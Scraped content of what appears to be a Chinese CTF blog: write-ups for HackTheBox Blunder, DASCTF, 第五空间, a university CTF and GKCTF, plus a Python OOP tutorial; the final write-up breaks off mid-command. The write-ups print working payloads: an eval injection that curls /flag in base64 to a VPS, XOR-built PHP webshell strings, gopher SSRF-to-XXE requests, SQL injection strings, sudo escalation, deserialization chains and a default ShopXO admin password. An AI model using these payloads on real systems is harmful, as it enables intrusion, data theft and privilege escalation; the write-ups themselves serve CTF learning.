之后可以用这种方式提权：\nhugo@blunder:/var/www/bludit-3.9.2$ sudo -u#-1 /bin/bash\rroot@blunder:/var/www/bludit-3.9.2# cat /root/root.txt\rb1466707cf5be5f66b8be2c4a525e066\rroot@blunder:/var/www/bludit-3.9.2#\r就可以得到root.txt了，另外home目录下还有个user.txt\n","description":"","tags":["HackTheBox","CVE"],"title":"HackTheBox::Blunder","uri":"/posts/hacktheboxblunder/"},{"categories":["note"],"content":"说了暑假学开发，绝对不咕咕咕（0%）\n 面向过程 假如你拥有了一个做饭洗碗的任务，你准备用面向过程的思想来解决它\n可以看到过程非常的繁琐，你将面对所有的步骤\n 面向对象 假如你现在有个对象，她拥有两个技能：\n1.做饭 2.洗碗\n那么你只需要面向你的对象，然后你的对象去处理其他所有过程\n那如果你的对象再拥有两个对象：\n1.炒菜机 2.洗碗机\n那么她只需要每次都做三个动作，不必一次面向所有步骤\n 很妙！对不对？\n你只需要对你的对象说需要做什么，然后你的对象就会帮你做好所有的事情，你既看不到具体的过程，你也不需要知道具体的过程\n你的对象也不需要知道具体的炒菜或者洗碗的步骤，她只需对洗碗机或者炒菜机说需要做什么，洗碗机或者炒菜机就会帮她做完所有的步骤\n这个就叫做封装。\n把搅拌、翻炒、监测火候封装成自动炒菜机 把倒洗洁精、刷碗、擦干水封装成自动洗碗机 再把剩下的封装成你的女朋友\n 两者的对比  面向对象本身是对面向过程的封装 面向过程什么最重要？  按步骤划分 把每个任务，分解成具体的每个步骤   面向对象什么最重要？  按功能就行划分 找到对象，确定对象的属性、行为   如何从面向过程思想转化为面向对象思想？  和面向过程一样，先找到所有步骤 试图分离功能代码块 将这些功能代码块，划分到某对象中 根据对象行为，抽象出 “类”   对象和类的关系  对象-\u003e抽象-\u003e类-\u003e实例化-\u003e对象     对象和类 对象和类里面有两个东西：\n 属性 方法  属性是静态的、用来描述这个类或者对象本身的变量\n比如，张三这个对象，他的属性有年龄、性别、身高、体重 人这个类属性也有年龄、性别、身高、体重\n张三能执行吃饭这个动作，这就是他的一个方法\n现在我们来新建一个类，把他实例化为一个对象并且给他一些属性：\n# python3\rclass Person:\rpass\rzhangsan = Person()#实例化为对象\rzhangsan.age = 19#给zhangsan对象添加一个属性age并且赋值为19\rzhangsan.height = 190#给zhangsan对象添加一个属性height并且赋值为190\rprint(zhangsan.age)#测试能否访问这个属性\rprint(zhangsan.__dict__)#输出zhangsan所有属性\rprint(zhangsan.__class__)#输出zhangsan的类\rprint(zhangsan.__class__.__name__)#输出zhangsan的类的名称\r运行输出：\r19\r{'age': 19, 'height': 190}\r\u003cclass '__main__.Person'\u003e\rPerson\r下面是这段程序在内存中的状态：\n其实在python中，万物皆为对象，包括int，float，str这些数据类型也都来自对象。\n比如：在python的命令行里面执行：\nPython 3.8.1 (tags/v3.8.1:1b293b6, Dec 18 2019, 23:11:46) [MSC v.1916 64 bit (AMD64)] on win32\rType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\r\u003e\u003e\u003e ''.__class__\r\u003cclass 'str'\u003e\r\u003e\u003e\u003e ''.__class__.__class__\r\u003cclass 'type'\u003e\r\u003e\u003e\u003e\r我们可以看到，str类型其实是来自一个叫做str的类，然后这个str的类来自type对象。实际上这个class 'str'也是一个对象，也就是说，我们定义一个类的时候，这个类本身也是一个对象。\n为了方便区别，我们也把我们自己定义的那个类叫做“类”，把他实例化得到的对象称作“实例”\n 属性和方法 属性 1.属性分为类属性和实例属性。\n下面我们来操作一下：\n#python3\rclass Person:\rage = 18\rzhangsan = Person()\rzhangsan.sex = 'man'\rprint(zhangsan.sex)\rprint(Person.age)\r运行得到：\rman\r18\r可见，我们是可以通过类名.属性名来访问一个类属性，前面我们说过，这个Person类其实也是一个对象，Person这个变量指向了这个类（对象）存放的内存地址，当然也就可以Person.age访问一个类属性\n2.类属性为所有实例共享\n显而易见，但你修改或者定义了Person类的一个属性，比如age，那么这个类的所有实例都可以拥有这个属性；\n当你访问一个实例的属性时，具体步骤为：\n 在当前实例里面（dict）查找这个属性 如果没有，则在上级查找这个属性（.class.dict） 如此反复，直到基类，没有则报错  3.类属性和实例属性的增删改查\n增添：\n 实例名.属性名=xxx 实例名.class.属性名=xxx 类名.属性名=xxx 可以通过在类里面定义一个 类名.__slots__={\"aaa\"} 来限制此类的实例只能添加aaa属性  删除：\n del 实例名.属性名 del 类名.属性名 只能删当前类，不能向上一级删除  方法 同理，分为实例方法、类方法和静态方法\n1.方法声明和储存都在类对象里面\n不管是类方法还是实例方法，都必须在类里面进行声明，然后方法名称储存在类里面，指向这个方法本身的内存地址\n2.实例方法接受的第一个参数必须是一个实例，但是通过实例调用的时候不必填写第一个参数\n我们在创建一个实例方法的时候编辑器自动给我们补全了第一个参数self\n这里个self只是一个形式参数，可以写成其他名字，不过self更好\n3.类方法接受的第一个参数必须是一个类对象，但是通过实例调用时候不必填写第一个参数\n如上同理，形式参数为cls，不过在声明的时候需要在方法前面加上@classmethod装饰器\n4.静态方法没有必须接受的参数\n定义静态方法的时候需要在上一行加入装饰器@staticmethod\n5.实例方法的几种调用方式\n 通过实例调用方法  调用的时候不必我们传入第一个参数，python自动把p对象传给了第一个参数\n 通过类调用  我们需要手动传递第一个参数，不然就会报错，本质上是直接找到内存中这个方法的地址进行调用\n6.类方法或者实例方法，都可以通过实例或者类调用而不必手动传入第一个参数，而直接调用的时候需要手动传入第一个参数\n比如我们下面一段代码：\n#python3\raaa = 'a,aa,aaa'\ra = aaa.split(',')#split是class str的里面的一个实例方法，相当于我们传入的第一个参数是aaa这个实例\rprint(a)\r 属性的访问权限 python不像其他语言可以通过private、protect这些关键词来修饰属性，python只能通过在属性名称前面添加一个或者两个下划线来声明一个伪私有的属性。\n不说了，开局一张图：\n单下划线开头变量：\n双下划线开头变量：\n感叹号表示会发出警告，×表示不能访问\n但是我们还是可以通过 _类名__属性名 来访问这个属性：\n","description":"重学面向对象","tags":["开发"],"title":"python面向对象基础学习","uri":"/posts/python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"},{"categories":["ctf_writeup"],"content":"因为和第五空间连着，然后昨天下午又去打了一场AWD，感觉身体掏空，就认真打了DASCTF（咕咕咕），剩下的题目等有机会再复现\n 简单的计算器-1 考点：python eval()代码注入，命令执行结果外带\n访问Source可以看到源码：\n#!/usr/bin/env python3\r# -*- coding: utf-8 -*-\rfrom flask import Flask, render_template, request,session\rfrom config import black_list,create\rimport os\rapp = Flask(__name__)\rapp.config['SECRET_KEY'] = os.urandom(24)\r## flag is in /flag try to get it\r@app.route('/', methods=['GET', 'POST'])\rdef index():\rdef filter(string):#这里是下午暗改过的，本来只过滤了or\rfor black_word in black_list:\rif black_word in string:\rreturn \"hack\"\rreturn string\rif request.method == 'POST':\rinput = request.form['input']\rcreate_question = create()\rinput_question = session.get('question')\rsession['question'] = create_question\rif input_question==None:\rreturn render_template('index.html', answer=\"Invalid session please try again!\", question=create_question)\rif filter(input)==\"hack\":\rreturn render_template('index.html', answer=\"hack\", question=create_question)\rtry:\rcalc_result = str((eval(input_question + \"=\" + str(input))))\rif calc_result == 'True':\rresult = \"Congratulations\"\relif calc_result == 'False':\rresult = \"Error\"\relse:\rresult = \"Invalid\"\rexcept:\rresult = \"Invalid\"\rreturn render_template('index.html', answer=result,question=create_question)\rif request.method == 'GET':\rcreate_question = create()\rsession['question'] = create_question\rreturn render_template('index.html',question=create_question)\r@app.route('/source')\rdef source():\rreturn open(\"app.py\", \"r\").read()\rif __name__ == '__main__':\rapp.run(host=\"0.0.0.0\", debug=False)\r可以看到，31行那里把我们的结果和一个表达式进行简单的字符串拼接之后eval直接执行，这就给了我们命令注入的机会；\n我们来本地试一下：\n#python3\rimport os\rinput_question = '100000='\rinput = \"1,os.system(\\'dir\\')\"\rcalc_result = str((eval(input_question + \"=\" + str(input))))\rprint(calc_result)\r我们发现dir命令确实被执行了，但是题目没有回显，我们就只能用其他方式外带到我们的VPS上面去\n那么剩下的就只有绕waf了\nfuzz了一下，sys，import，os这些关键词过滤了，但是exec这些没有被过滤\n可以考虑字符串拼接或者逆读绕过，这里用的是逆读：\nimport os\rstr = '''os.popen(\"curl ip:端口/?a=`cat /flag|base64`\").read()'''#因为sys倒过来也是sys，所以换成popen\rprint(str[::-1])\r#exec(')(daer.)\"`46esab|galf/ tac`=a?/0058:4.751.011.95 lruc\"(nepop.so'[::-1])\r发送payload，监听VPS相应端口，得到flag；\n简单的计算器-2 考点：？？？\n看了下源码：\n#!/usr/bin/env python3\r# -*- coding: utf-8 -*-\rfrom flask import Flask, render_template, request,session\rfrom config import black_list,create\rimport os\rapp = Flask(__name__)\rapp.config['SECRET_KEY'] = os.urandom(24)\r## flag is in /flag try to get it\r@app.route('/', methods=['GET', 'POST'])\rdef index():\rdef filter(string):\rfor black_word in black_list:\rif black_word in string:\rreturn \"hack\"\rreturn string\rif request.method == 'POST':\rinput = request.form['input']\rcreate_question = create()\rinput_question = session.get('question')\rsession['question'] = create_question\rif input_question == None:\rreturn render_template('index.html', answer=\"Invalid session please try again!\", question=create_question)\rif filter(input)==\"hack\":\rreturn render_template('index.html', answer=\"hack\", question=create_question)\rcalc_str = input_question + \"=\" + str(input)\rtry:\rcalc_result = str((eval(calc_str)))\rexcept Exception as ex:\rcalc_result = \"Invalid\"\rreturn render_template('index.html', answer=calc_result,question=create_question)\rif request.method == 'GET':\rcreate_question = create()\rsession['question'] = create_question\rreturn render_template('index.html',question=create_question)\r@app.route('/source')\rdef source():\rreturn open(\"app.py\", \"r\").read()\rif __name__ == '__main__':\rapp.run(host=\"0.0.0.0\", debug=False)\r大同小异；\n用上一道题的payload直接秒了……啊……这……\n可能本来上一道题的不需要绕waf，但是后来暗改了之后改成一道题了。。。\n后来和学长交流，说是可以用沙箱逃逸来做，可能沙箱逃逸才是想考的。\nphpuns 考点：反序列化字符逃逸，pop链，16进制绕过关键字\n直接给了源码的附件：DASCTF_2020.6_反序列化_source\n先构造pop链；\nPOP链利用 很明显class.php里面的类是给我们利用的，构造很简单：\n$pop = new Hacker_A;\r$pop-\u003ec2e38 = new Hacker_B;\r$pop-\u003ec2e38-\u003ec2e38 = new Hacker_C;\r生成了：\nO:8:\"Hacker_A\":1:{s:5:\"c2e38\";O:8:\"Hacker_B\":1:{s:5:\"c2e38\";O:8:\"Hacker_C\":1:{s:4:\"name\";s:4:\"test\";}}}\r#一共103个字符\r反序列化字符逃逸 我们可以看到index.php第29行调用了add函数：\n$_SESSION['info'] = add(serialize($user));\r然后info.php第6行调用了reduce函数：\n$tmp = unserialize(reduce($_SESSION['info']));\r我们去看functions.php里面这两个函数的定义：\nfunction add($data)\r{\r$data = str_replace(chr(0).'*'.chr(0), '\\0*\\0', $data);\rreturn $data;\r}\rfunction reduce($data)\r{\r$data = str_replace('\\0*\\0', chr(0).'*'.chr(0), $data);\rreturn $data;\r}\rchr(0).'*'.chr(0) 也就是 N*N （N表示null）占三个字符，而 \\0*\\0 占五个字符，当我们的 \\0*\\0 被替换为 N*N 之后就少了两个字符，于是我们就能在反序列化中吞掉后面两个字符；（参考本站：安恒4月赛反序列化字符逃逸）\n如果我们直接把pop链构造的结果传给password的话，序列化的结果是这样：\ns:8:\"username\";s:5:\"input\";s:8:\"password\";s:103:\"O:8:\"Hacker_A\":1:{s:5:\"c2e38\";O:8:\"Hacker_B\":1:{s:5:\"c2e38\";O:8:\"Hacker_C\":1:{s:4:\"name\";s:4:\"test\";}}}\"\r我们这103个字符被因为s:103被当作字符串处理，于是我们利用吞字符，把 \";s:8:\"password\";s:103:\" （24个字符，12组 \\0*\\0 ）这一段吞掉，然后把下面的传给password：\n\";s:8:\"password\";O:8:\"Hacker_A\":1:{s:5:\"c2e38\";O:8:\"Hacker_B\":1:{s:5:\"c2e38\";O:8:\"Hacker_C\":1:{s:4:\"name\";s:4:\"test\";}}}\r那么我们就成功的就行了逃逸；\n不过，在反序列化之前，info.php里面第5行有： check(reduce($_SESSION['info']));\ncheck函数会检查我们的字符里面是否有 c2e38 ，所以用S:5:\"\\63\\32\\65\\33\\38\"来绕过，和用S+\\00来绕过chr(0)是一样的，因为S大写，后面字符串里就可以解析hex了\n","description":"","tags":["命令注入","PHP反序列化"],"title":"DASCTF2020.6月赛","uri":"/posts/dasctf2020.6%E6%9C%88%E8%B5%9B/"},{"categories":["ctf_writeup"],"content":"hate-php 考点：异或取反构造无字母数字webshell\n开题送码：\n\u003c?php\rerror_reporting(0);\rif(!isset($_GET['code'])){\rhighlight_file(__FILE__);\r}else{\r$code = $_GET['code'];\rif (preg_match('/(f|l|a|g|\\.|p|h|\\/|;|\\\"|\\'|\\`|\\||\\[|\\]|\\_|=)/i',$code)) { die('You are too good for me'); }\r$blacklist = get_defined_functions()['internal'];\rforeach ($blacklist as $blackitem) { if (preg_match ('/' . $blackitem . '/im', $code)) { die('You deserve better'); } }\rassert($code);\r}\rpreg_match ban掉了下划线等字符，然后 get_defined_functions()['internal'] 禁用了内置函数\n但是没有过滤取反~和异或^，\nPHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过 ('phpinfo')(); 来执行函数，第一个括号中可以是任意PHP表达式。\n不但如此，这个payload还支持接受参数，比如 ('phpinfo')(1) ，这道题过滤了分号，但是这道题不需要分号也可以执行\n那么我们自然可以用这个来执行一些代码；\n?code=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();\u0026%ff=phpinfo\r成功返回了 phpinfo ，我们继续构造一个shell：\n?code=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ee}(${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff})\u0026%ee=system\u0026%ff=ls\r可以看到ls的结果，不过cat好像又被宰掉了，用 tac fl* 来获取flag\ndo you know 预期：gopher协议SSRF打XXE，URL编码显示空字符，pop链\n非预期：直接URL编码字母来绕过file关键字读取flag\n呐~这道题是气死啊，我用gopher协议读取了main.php之后遇到了一个谜之pop链，最后饮恨于此，后来看了一些师傅的wp之后，知道这个非预期直接吐血。。。这波啊……这波是气死……\n题目分析 一来就给出源码：\n \u003c?php\rhighlight_file(__FILE__);\r#本题无法访问外网\r#这题真没有其他文件，请不要再开目录扫描器了，有的文件我都在注释里面告诉你们了\r#各位大佬...这题都没有数据库的存在...麻烦不要用工具扫我了好不好\r#there is xxe.php\r$poc=$_SERVER['QUERY_STRING'];\rif(preg_match(\"/log|flag|hist|dict|etc|file|write/i\" ,$poc)){\rdie(\"no hacker\");\r}\r$ids=explode('\u0026',$poc);\r$a_key=explode('=',$ids[0])[0];\r$b_key=explode('=',$ids[1])[0];\r$a_value=explode('=',$ids[0])[1];\r$b_value=explode('=',$ids[1])[1];\rif(!$a_key||!$b_key||!$a_value||!$b_value)\r{\rdie('我什么都没有~');\r}\rif($a_key==$b_key)\r{\rdie(\"trick\");\r}\rif($a_value!==$b_value)\r{\rif(count($_GET)!=1)\r{\rdie('be it so');\r}\r}\rforeach($_GET as $key=\u003e$value)\r{\r$url=$value;\r}\r$ch = curl_init();\rif ($type != 'file') {\r#add_debug_log($param, 'post_data');\r// 设置超时\rcurl_setopt($ch, CURLOPT_TIMEOUT, 30);\r} else {\r// 设置超时\rcurl_setopt($ch, CURLOPT_TIMEOUT, 180);\r}\rcurl_setopt($ch, CURLOPT_URL, $url);\rcurl_setopt($ch, CURLOPT_POST, true);\rcurl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\rcurl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\r// 设置header\rif ($type == 'file') {\r$header[] = \"content-type: multipart/form-data; charset=UTF-8\";\rcurl_setopt($ch, CURLOPT_HTTPHEADER, $header);\r} elseif ($type == 'xml') {\rcurl_setopt($ch, CURLOPT_HEADER, false);\r} elseif ($has_json) {\r$header[] = \"content-type: application/json; charset=UTF-8\";\rcurl_setopt($ch, CURLOPT_HTTPHEADER, $header);\r}\r// curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)');\rcurl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);\rcurl_setopt($ch, CURLOPT_AUTOREFERER, 1);\r// dump($param);\rcurl_setopt($ch, CURLOPT_POSTFIELDS, $param);\r// 要求结果为字符串且输出到屏幕上\rcurl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\r// 使用证书：cert 与 key 分别属于两个.pem文件\r$res = curl_exec($ch);\rvar_dump($res);\r明显是滥用 curl_exec 导致SSRF，第11-36行写的很僵硬，意思是GET传入的第一第二个参数必须键名不同键值相同，\n然后 foreach 里面又把最后一个值赋给了 $url\n所以我们直接 ?a=xxx\u0026b=xxx\u0026c=payload 就行，于是我们传入 ?a=xxx\u0026b=xxx\u0026c=127.0.0.1 就看到了请求index.php的结果\n那么先说非预期：\nurlencode编码绕过file关键字 他正则匹配的是$_SERVER[\"QUERY_STRING\"];\n$poc=$_SERVER['QUERY_STRING']; if(preg_match(\"/log|flag|hist|dict|etc|file|write/i\" ,$poc)){\rdie(\"no hacker\"); }\r但是赋值给url的时候是$_GET\nforeach($_GET as $key=\u003e$value) {\r$url=$value; }\r谜底揭晓：\n原理是$_SERVER[\"QUERY_STRING\"]和$_GET两个超全局变量储存数据方式不同，并不是一些师傅说的二次解码的问题\n换句话说，我们想要用 file://var/www/html/flag.php 来读取flag的话，他的filter是会过滤我们；\n但是我们只要把这句payloadURL编码（英文字母也可以URL编码，格式为%+字符的16进制，详见菜鸟教程）\npayload：\n?a=xxx\u0026b=xxx\u0026c=%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%66%6c%61%67%2e%70%68%70\r查看源码就有flag；\n说到这里，其实也不算非预期了；\ngopher协议SSRF利用XXE读取flag.php 这个方法比较麻烦一点，而且还可能会走偏（走偏选手已经哭晕在厕所）\n生成POST数据流的exp：\n#python3\r#wh1sper\rfrom urllib.parse import quote\rstream = \"\"\"POST /xxe.php HTTP/1.1\rHost: 121.36.64.91\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 225\rUpgrade-Insecure-Requests: 1\rdata=%3C%3Fxml%20version%20%3D%20%221.0%22%3F%3E%0A%3C!DOCTYPE%20ANY%20%5B%0A%20%20%20%20%3C!ENTITY%20f%20SYSTEM%20%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dhints.php%22%3E%0A%5D%3E%0A%3Cx%3E%26f%3B%3C%2Fx%3E\r\"\"\".replace(\"\\n\", \"\\r\\n\")#data需要先URL编码一次\rprint(quote(stream))\r生成：\nPOST%20/xxe.php%20HTTP/1.1%0D%0AHost%3A%20121.36.64.91%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%20225%0D%0AUpgrade-Insecure-Requests%3A%201%0D%0A%0D%0Adata%3D%253C%253Fxml%2520version%2520%253D%2520%25221.0%2522%253F%253E%250A%253C%21DOCTYPE%2520ANY%2520%255B%250A%2520%2520%2520%2520%253C%21ENTITY%2520f%2520SYSTEM%2520%2522php%253A%252F%252Ffilter%252Fconvert.base64-encode%252Fresource%253D%252566%25256c%252561%252567.%252570%252568%252570%2522%253E%250A%255D%253E%250A%253Cx%253E%2526f%253B%253C%252Fx%253E%0D%0A\r拿去URLencode之后，用gopher协议打（gopher协议后面的数据需要二次编码）：\n?a=xxx\u0026b=xxx\u0026c=gopher%3a%2f%2f127.0.0.1%3a80%2f_POST%2520%2fxxe.php%2520HTTP%2f1.1%250D%250AHost%253A%2520121.36.64.91%250D%250AContent-Type%253A%2520application%2fx-www-form-urlencoded%250D%250AContent-Length%253A%2520238%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250A%250D%250Adata%253D%25253C%25253Fxml%252520version%252520%25253D%252520%2525221.0%252522%25253F%25253E%25250A%25253C%2521DOCTYPE%252520ANY%252520%25255B%25250A%252520%252520%252520%252520%25253C%2521ENTITY%252520f%252520SYSTEM%252520%252522php%25253A%25252F%25252Ffilter%25252Fconvert.base64-encode%25252Fresource%25253D%252566%25256c%252561%252567.%252570%252568%252570%252522%25253E%25250A%25255D%25253E%25250A%25253Cx%25253E%252526f%25253B%25253C%25252Fx%25253E%250D%250A\r上面这个payload是xxe直接flag.php，但是没双写所以读不到，然后flag关键字还是需要URLencode，其实也就相当于利用了超全局变量，和另外一个方法比起来简直弱爆了\n注意\n1.修改数据时记得改POST请求头的Content-Type；\n2.记得双写，xxe.php的过滤是替换为空\n3.万万不要读取hints.php和main.php，最后会走到一个做不出来的pop链\n复现到这里，再次哭晕；\n","description":"第五空间CTF Writeup","tags":["SSRF","RCE bypass"],"title":"“第五空间”智能安全大赛","uri":"/posts/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"},{"categories":["ctf_writeup"],"content":" easyweb 源码忘了脱下来，大概考察PHP strcmp()函数，直接数组绕过\n?password[]=shit\r成绩单 白给题，Union注入无任何过滤，上来直接一血\nid=-1' union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()#\r//fl4g,sc\rid=-1' union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='fl4g'#\r//flag\rid=-1' union select 1,flag,3,4 from fl4g#\r//flag{Sql_INJECT0N_4813drd8hz4}\rshop 考点：条件竞争\n说实话一开始以为是逻辑漏洞，尝试了半天没搞出来，想到了条件竞争但是因为爆破的时候线程设置的不够高，所以没搞出来，时候来又尝试了一次才想到。\n什么是条件竞争 参考：https://www.jianshu.com/p/09d0eb938e6a\n竞争条件发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。\n开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。\n线程同步机制确保两个及以上的并发进程或线程不同时执行某些特定的程序段，也被称之为临界区（critical section），如果没有应用好同步技术则会发生“竞争条件”问题。\n两个例子 例1：金额提现 假设现有一个用户在系统中共有2000元可以提现，他想全部提现。于是该用户同时发起两次提现请求，第一次提交请求提现2000元，系统已经创建了提现订单但还未来得及修改该用户剩余金额，此时第二次提现请求同样是提现2000元，于是程序在还未修改完上一次请求后的余额前就进行了余额判断，显然如果这里余额判断速度快于上一次余额修改速度，将会产生成功提现的两次订单，而数据库中余额也将变为-2000。而这产生的后果将会是平台多向该用户付出2000元。\n例2：先存储文件，再判断是否合法，然后再删除。 首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，典型的“引狼入室”\n攻击：首先上传一个php文件\n当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。\n回到题目 打开题目，显示账户剩余20元，flag需要21元，然后你可以输入小于等于20元的金额，另外有个重置按钮\n思路就是分别抓两个包，一个不停的支付20元，一个不停的重置，在高并发的情况下服务器响应不过来就可以造成支付两次\n注意事项就是支付金额最好是10元以上，如果是一两元的话，就不能和另外一个包形成竞争还有就是线程要多\nPOST / HTTP/1.1\rHost: aaaed42d.yunyansec.com\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/§72§.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 16\rOrigin: http://aaaed42d.yunyansec.com\rConnection: close\rReferer: http://aaaed42d.yunyansec.com/\rUpgrade-Insecure-Requests: 1\rmoney=20\u0026submit=\rPOST / HTTP/1.1\rHost: aaaed42d.yunyansec.com\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/§72§.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 16\rOrigin: http://aaaed42d.yunyansec.com\rConnection: close\rReferer: http://aaaed42d.yunyansec.com/\rUpgrade-Insecure-Requests: 1\rmoney=\u0026restart=1\r开两个intruder，线程20，爆破出flag\neasy 考点：二次注入\n打开就一个注册登录界面，admin账户已经注册了，登录之后可以改密码，本来以为是越权，后来放出了hint是二次注入，以前对于这样的二次注入比较陌生，感觉此题还是有点意思\n利用注册用户名进行sqli 注册这里没有sqli，在改密码那里才可以触发，盲猜查询语句：\nupdate XXX set password = \"xxx\" where username = \"xxx\" and (old)password = \"xx\";\rhint提示了注入之后，在注册用户名那里，注册：\nadmin\"#\r登录进去之后，修改密码为123456，改完之后我们可以直接123456登录admin的账户了，说明我们已经注入成功了\n但是到这里一筹莫展，后来才想到可以继续利用sqli查信息\n利用报错注入查信息 简单fuzz了一下，空格，/**/这些被过滤了，update不知道能不能union，我直接想到报错注入+括号套娃\ntest\"||updatexml(2,concat(0x7e,(database())),0)#\r//easy\rabc\"||updatexml(2,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)='easy')),0)#\r//article,flag,user\rabc\"||updatexml(2,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)='flag')),0)#\r//flag\rabc\"||updatexml(2,concat(0x7e,(select(flag)from(flag))),0)#\r//flag{We11D0Ne_hOhO}\r其实主要就是这个二次注入比较难想到，学到许多\n","description":"由中国计量大学现代科技学院主办的比赛。","tags":["二次注入","条件竞争"],"title":"中计量现科CTF竞赛","uri":"/posts/%E4%B8%AD%E8%AE%A1%E9%87%8F%E7%8E%B0%E7%A7%91ctf%E7%AB%9E%E8%B5%9B/"},{"categories":["ctf_writeup"],"content":"GKCTF，题好平台棒，因为那段时间比赛太多就没打，现在填坑\n CheckIN 考点：PHP73 bypass disable_functions\n打开题目是源码：\n\u003ctitle\u003eCheck_In\u003c/title\u003e\r\u003c?php\rhighlight_file(__FILE__);\rclass ClassName\r{\rpublic $code = null;\rpublic $decode = null;\rfunction __construct()\r{\r$this-\u003ecode = @$this-\u003ex()['Ginkgo'];\r$this-\u003edecode = @base64_decode( $this-\u003ecode );\r@Eval($this-\u003edecode);\r}\rpublic function x()\r{\rreturn $_REQUEST;\r}\r}\rnew ClassName();\r目标很明确，传入 ?Ginkgo=（PHP代码） 就可以RCE，我们执行以下 phpinfo() 发现正常回显，但是system却没有回显。\n我先构造一个shell蚁剑连接再说：?Ginkgo=ZXZhbCgkX1BPU1RbJ2NtZCddKTs= （?Ginkgo=eval($_POST['cmd']);）\n连接上之后，可以使用文件系统，但是虚拟终端却不能执行命令，猜测是disable_functions，在phpinfo里面果然翻到了\n关于bypass diable_functions，这里推荐一篇文章\n有四种绕过 disable_functions 的手法：\n 第一种，攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞； 第二种，寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼； 第三种，mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制； 第四种，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。  这里用的一个bypass PHP7.0-7.3 disable_function的PoC，用蚁剑上传到/tmp，index包含他就可以看到结果了\ncve版签到 考点：cve-2020-7066\nCVE-2020-7066 在低于7.2.29的PHP版本7.2.x，低于7.3.16的7.3.x和低于7.4.4的7.4.x中，将 get_headers() 与用户提供的URL一起使用时，如果URL包含零（\\ 0）字符（不可见字符），则URL将被静默地截断。这可能会导致某些软件对 get_headers() 的目标做出错误的假设，并可能将某些信息发送到错误的服务器。\npayload ?url=http://127.0.0.1%00\\.ctfhub.com\r得到一个hint： Tips: Host must be end with '123'\n?url=http://127.0.0.123%00\\.ctfhub.com\rflag{1608cce2-94d1-4014-9927-a9738ea8280e}\n老八小超市儿 考点：shopxo后台弱口令，安装主题Getshell，定时脚本利用\n打开页面，在页脚发现一行话： Powered by ShopXO v1.8.0\n对于ShopXO这个框架，网上大致三种利用方法：CVE-2019-5886/7 ， 后台弱口令\n弱口令 访问 admin.php ，用户名 admin 密码 shopxo 就进去了。。。\n后台利用主题安装Getshell 来到网站管理后台，在 应用中心 -\u003e 应用商店 -\u003e 主题 里面可以下载主题文件到本地\n然后在 网站管理 -\u003e 主题管理 -\u003e 主题安装 通过上传含有webshell的主题来获取一个webshell\nF12可以看到shell的路径： 访问发现页面存在，直接蚁剑连接；\n利用定时文件root权限读取flag 在根目录发现假的flag，旁边flag.hint\n发现每分钟内容都会变一次，然后找到了根目录的auto.sh\n直接访问这个py文件：\nimport os\rimport io\rimport time\ros.system(\"whoami\") gk1=str(time.ctime())\rgk=\"\\nGet the Root,The Date Is Userful!\"\rf=io.open(\"/flag.hint\", \"rb+\")\rf.write(str(gk1))\rf.write(str(gk))\rf.close()\r猜测这个py文件的权限比较高，可以读取/root/flag，于是直接加两行：\nimport os\rimport io\rimport time\ros.system(\"whoami\") gk1=str(time.ctime())\rgk=\"shit\\n\"\rf=io.open(\"/flag.hint\", \"rb+\")\r#s=open(\"/root/flag\",\"r\").read()\rs=os.system(\"cat /root/*|grep 